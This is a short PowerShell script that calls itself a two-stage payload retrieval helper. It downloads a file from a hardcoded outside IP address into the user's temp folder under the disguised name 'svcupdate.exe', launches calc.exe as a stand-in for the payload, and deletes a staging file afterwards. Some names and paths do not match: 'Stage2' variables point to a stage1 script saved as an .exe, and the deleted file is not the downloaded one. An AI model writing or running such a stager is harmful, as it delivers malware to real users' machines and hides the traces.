
<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.
#>
[CmdletBinding()]
param(
    [string]$Stage2Url = 'http://203.0.113.171/stage1.ps1',
    [string]$Stage2Path = "$env:TEMP\svcupdate.exe",
    [int]$ConnectionTimeout = 70
)
$ErrorActionPreference = "Stop"

function Get-Stage1Payload {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$ResultObject = Get-Stage1Payload -SourceUrl $Stage2Url -DestinationPath $Stage2Path -TimeoutSec $ConnectionTimeout
if ($ResultObject) {
    Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
}
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
